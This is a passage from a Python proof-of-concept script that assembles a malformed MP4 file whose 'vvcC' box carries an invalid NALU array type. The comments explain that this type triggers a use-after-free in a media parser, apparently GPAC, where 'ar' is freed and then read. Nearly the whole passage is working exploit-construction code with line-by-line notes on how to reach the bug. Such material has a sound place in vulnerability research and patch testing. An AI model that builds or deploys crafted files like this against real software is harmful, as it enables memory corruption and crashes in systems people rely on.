es ar->type at line 1403\n\nvvcc_payload = b\'\'\n\n# VVC configuration header (minimal, set ptl_present_flag=0 to skip PTL parsing)\nvvcc_payload += struct.pack(\'>B\', 0x03)  # reserved(5)=0 + lengthSizeMinusOne(3)=3\nvvcc_payload += struct.pack(\'>B\', 0x00)  # ptl_present_flag(1)=0 + ols_idx bit 8\nvvcc_payload += struct.pack(\'>B\', 0x00)  # ols_idx bits 7-0\nvvcc_payload += struct.pack(\'>B\', 0x00)  # ols_idx last bit + num_sublayers(3)=0 + constant_frame_rate(2)=0 + chroma_format_idc(2)=0\nvvcc_payload += struct.pack(\'>B\', 0x00)  # bit_depth_minus8(3)=0 + reserved(5)=0\n\n# numOfArrays = 1 (we only need one invalid array to trigger the bug)\nvvcc_payload += struct.pack(\'>B\', 0x01)\n\n# CRITICAL: Use INVALID NALU type to trigger the UAF\n# Valid types: 12(OPI), 13(DEC_PARAM), 14(VID_PARAM), 15(SEQ_PARAM), 16(PIC_PARAM), 23(SEI_PREFIX), 24(SEI_SUFFIX)\n# Use type 11 (GF_VVC_NALU_SLICE_GDR=10 or 11) which is NOT in the valid switch cases\ninvalid_type = 11  # This will hit the default case and trigger gf_free(ar) at line 1399\narray_byte = (0 << 7) | (0 << 5) | invalid_type  # array_completeness=0, reserved=0, type=11\nvvcc_payload += struct.pack(\'>B\', array_byte)\n\n# After the switch statement, line 1403 checks ar->type (UAF!)\n# Since type=11 (not 13 or 12), it will try to read numNalus (16 bits)\nvvcc_payload += struct.pack(\'>H\', 1)  # numNalus = 1\n\n# Provide a valid NALU (size >= 2 to pass check at line 1411)\nvvcc_payload += struct.pack(\'>H\', 2)  # nalUnitLength = 2\nvvcc_payload += b\'\\x00\\x00\'  # dummy NALU data\n\nvvc_entry += write_box(b\'vvcC\', vvcc_payload)\n\nstsd_payload += write_box(b\'vvc1\', vvc_entry)\nstbl_data += write_box(b\'stsd\', stsd_payload)\n\n# Other required stbl boxes (minimal)\nstbl_data += write_fullbox(b\'stts\', 0, 0, struct.pack(\'>I\', 0))\nstbl_data += write_fullbox(b\'stsc\', 0, 0, struct.pack(\'>I\', 0))\nstbl_data += write_fullbox(b\'stsz\', 0, 0, struct.pack(\'>II\', 0, 0))\nstbl_data += write_fullbox(b\'